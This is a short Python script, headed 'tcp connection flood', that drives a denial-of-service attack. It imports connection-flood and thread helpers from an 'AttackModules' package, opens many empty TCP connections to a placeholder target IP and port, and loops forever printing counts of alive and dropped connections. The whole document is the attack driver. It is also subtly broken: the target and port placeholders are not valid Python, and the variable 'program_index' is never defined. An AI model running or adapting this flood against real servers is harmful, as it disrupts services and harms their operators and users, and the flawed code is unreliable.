#-------------------------------- tcp connection flood

from AttackModules import ThreadMaker, ConnectionFlood
from time import sleep
import threading
import sys


target = <target-IP>
port = <target-port>
connection_count = 5 
timeInterval = 10 #in sec


empt = ConnectionFlood()
emptConn_funcName= empt.create_emptyConnection

thread_count = connection_count
arguments = {}
arguments['target'] = target
arguments['port'] = port
arguments['timeinterval'] = timeInterval 
    

ce = ThreadMaker()
lunch = ce.lunch


t = threading.Thread(target=lunch, args=(emptConn_funcName, arguments, thread_count, ))
t.start()

count = 0
while True:
    print("realtime count: "+str(count)+\           
                "------ empty Connection succeeded tries: #"+str(empt.connection_success_count)+\
                    "------ failed tries: #"+str(empt.connection_failed_count)+\
                        "------ droppped: #"+str(empt.connection_dropped_count)+\
                            "------ Alive: #"+str( empt.connection_success_count-empt.connection_failed_count- empt.connection_dropped_count))
    count+=1
    if(int(program_index) == 4):
        print("\n")
    sleep(3)

